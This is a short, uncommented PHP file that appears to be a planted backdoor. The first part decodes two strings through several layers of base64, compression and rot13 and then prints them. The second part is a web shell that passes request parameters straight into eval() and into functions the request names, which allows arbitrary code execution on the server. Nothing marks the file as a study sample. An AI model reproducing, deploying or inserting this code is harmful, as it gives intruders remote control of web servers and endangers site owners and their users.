<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "fYz\x41TvWJS0G\x41ZnrL37K/R1FMI3MufnWRm94sH7sSJ\x62XuZ6FrL\x62yrZuqIJ2jidw48MIki0t\x63W0Xm2kNJ4gpdvrfj6s\x63O5ovQDzfN9vdz/jZ4SsF0uM4\x43j/\x627wnMqDi9\x62/YFGDjxJe/3J\x41iFw/Y\x43wZ\x42wJe";
print_r(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
print_r("?>".str_rot13(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(base64_decode(strrev($Lix))))))))))));
?>
<?php 
$_GET[5]($_GET[4](eval("$_GET[0]($_GET[1]($_GET[2], $_GET[3]));")), $_GET[6]);
?>